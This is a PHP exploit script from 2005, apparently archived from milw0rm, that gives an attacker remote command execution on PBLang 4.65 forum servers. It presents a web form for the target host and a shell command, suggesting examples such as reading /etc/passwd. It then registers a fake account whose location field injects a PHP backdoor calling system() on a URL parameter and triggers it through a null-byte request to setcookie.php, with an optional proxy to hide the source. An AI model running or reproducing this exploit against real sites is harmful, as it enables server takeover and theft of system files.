<?php
/* PBLang 4.65 (possibly prior versions) remote code execution
   by rgod -> site: http://rgod.altervista.org
   make these changes in php.ini if you have troubles with this script:
   allow_call_time_pass_reference = on
   register_globals = on						       */

   error_reporting(0);
   ini_set("max_execution_time",0);
   ini_set("default_socket_timeout", 2);
   ob_implicit_flush (1);

   echo '<head><title>PBLang 4.65 remote commands execution</title>
         <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
         <style type="text/css">
         <!--
         body,td,th {color: #00FF00;}
         body {background-color: #000000;}
         .Stile5 {font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
         .Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif;
	       font-weight: bold;
	       font-style: italic;
              }
         -->
         </style></head>
         <body>
         <p class="Stile6">PBLang 4.65 (possibly prior versions) remote commands execution</p>
         <p class="Stile6">a script by rgod at <a href="http://rgod.altervista.org" target="_blank">http://rgod.altervista.org</a></p>
         <table width="84%" >
         <tr>
         <td width="43%">
         <form name="form1" method="post" action="'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&command=value&proxy=value">
         <p>
         <input type="text" name="host">
         <span class="Stile5">hostname (ex: www.sitename.com) </span></p>
         <p>
         <input type="text" name="path">
         <span class="Stile5">path (ex: /pblang/ or /forum/ or just /) </span></p>
         <p>
         <input type="text" name="port">
         <span class="Stile5">specify a port other than 80 (default value) </span></p>
         <p>
         <input type="text" name="command">
         <span class="Stile5">a Unix command, example: ls -la to list directories, cat /etc/passwd to show passwd file </span></p>
         <p>
         <input type="text" name="proxy">
         <span class="Stile5">send exploit through an HTTP proxy (ip:port)  </span></p>
         <p>
         <input type="submit" name="Submit" value="go!">
         </p>
         </form></td>
         </tr>
         </table>
         </body>
         </html>';


function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }

echo "</tr></table>";
}

$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';


if (($path<>'') and ($host<>'') and ($command<>''))
{
if ($port=='') {$port=80;}

$anumber=rand();

         $data="user=jimihendrix".$anumber."&pass=jimijimi&pass2=jimijimi&em=jimimail".$anumber."@jimimail.com&realname=&alias=&msn=&icq=&aim=&yahoo=&qq=&web=http%3A%2F%2F&loc=".urlencode('madrid"; error_reporting(0); system($HTTP_GET_VARS[cmd]); echo "') ."&pt=colorgination.com+harness+racing+video&av=none&webav=&sig=&regcode=1126055838&lang=en&accept=1&Submit=Submit";

if ($proxy=='')
        { $packet="POST ".$path."register.php?reg=2 HTTP/1.1\r\n"; }
        else
        {
        $c = preg_match_all($proxy_regex,$proxy,$is_proxy);
        if ($c==0) {
                    echo 'check the proxy...<br>';
	            die;
	           }
         else
	{ $packet="POST http://".$host.$path."register.php?reg=2 HTTP/1.1\r\n";}
	}

         $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
         $packet.="Referer: ".$host.$path."register.php?reg=1\r\n";
         $packet.="Accept-Language: en\r\n";
         $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
         $packet.="Accept-Encoding: gzip, deflate\r\n";
         $packet.="User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n";
         $packet.="Host: ".$host."\r\n";
         $packet.="Content-Length: ".strlen($data)."\r\n";
         $packet.="Connection: Keep-Alive\r\n";
         $packet.="Cache-Control: no-cache\r\n\r\n";
	 $packet.=$data;

show($packet);
if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }
fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));

if ($proxy=='')
        { $packet="GET ".$path."setcookie.php?u=jimihendrix".$anumber."%00&cmd=".urlencode($command)." HTTP/1.1\r\n"; }
        else
        { $packet="GET http://".$host.$path."setcookie.php?u=jimihendrix".$anumber."%00&cmd=".urlencode($command)." HTTP/1.1\r\n"; }

         $packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, */*\r\n";
         $packet.="Referer: ".$host.$path."login.php\r\n";
         $packet.="Accept-Language: en\r\n";
         $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
         $packet.="Accept-Encoding: gzip, deflate\r\n";
         $packet.="User-Agent: Mozilla/5.0 (compatible; Konqueror/3.3; Linux) KHTML/3.3.2 (like Gecko)\r\n";
         $packet.="Host: ".$host."\r\n";
         $packet.="Content-Length: ".strlen($data)."\r\n";
         $packet.="Connection: Keep-Alive\r\n";
         $packet.="Cache-Control: no-cache\r\n\r\n";
//	 $packet.=$data;
show($packet);
if ($proxy=='')
           {$fp=fsockopen(gethostbyname($host),$port);}
           else
           {$parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $fp=fsockopen($parts[0],$parts[1]);
	    if (!$fp) { echo 'No response from proxy...';
			die;
		       }
	    }

fputs($fp,$packet);
$data='';
if ($proxy=='')
{
while (!feof($fp))
{
$data.=fgets($fp);
}
}
else
{
$data='';
   while ((!feof($fp)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$data)))
   {
      $data.=fread($fp,1);
   }

}
fclose($fp);
echo nl2br(htmlentities($data));

}
?>

// milw0rm.com [2005-09-07]
